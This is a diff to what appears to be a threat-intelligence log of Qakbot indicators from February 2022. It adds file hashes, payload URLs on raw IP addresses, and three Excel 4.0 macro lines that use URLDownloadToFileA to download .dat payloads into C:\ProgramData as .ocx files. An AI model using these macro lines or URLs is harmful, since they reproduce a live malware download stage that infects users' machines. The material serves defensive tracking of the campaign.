@@ -1,5 +1,20 @@
 21.02.2022 | Qakbot | obama158 | 
 
+.xls 6cc35c64d7f28ab60d23e7bd1d21928ee46aa8923f0a40bccb317e3b5a57353d
+.dll 5c9d833059550fba6ce9474cf0d23d07d79ffc99bedeac78a55d2271160b91af
+
+http://94.140.114.240/44613.7675072917.dat
+http://194.156.98.30/44613.7675072917.dat
+http://144.217.50.246/44613.7675072917.dat
+
+=CALL("uRlMon", "URLDownloadToFileA", "JCCB", 0, "http://94.140.114.240/44613.8105363426.dat", "C:\ProgramData\Hroser1.ocx")
+=CALL("uRlMon", "URLDownloadToFileA", "JCCB", 0, "http://194.156.98.30/44613.8105363426.dat", "C:\ProgramData\Hroser2.ocx")
+=CALL("uRlMon", "URLDownloadToFileA", "JCCB", 0, "http://144.217.50.246/44613.8105363426.dat", "C:\ProgramData\Hroser3.ocx")
+
+http://94.140.114.240/44613.7675072917.dat
+http://194.156.98.30/44613.7675072917.dat
+http://144.217.50.246/44613.7675072917.dat
+
 *************************************************
 
 .xls 356d2a40b411801099ec995ee7c592937b4e4ad53a0485312263e17ce9bc7cdb
@@ -12,6 +27,8 @@
 http://79.141.162.186/44613.6382221065.dat
 http://185.190.80.173/44613.6382221065.dat
 http://185.244.150.170/44613.6382221065.dat
+
+
 
 c2's
 
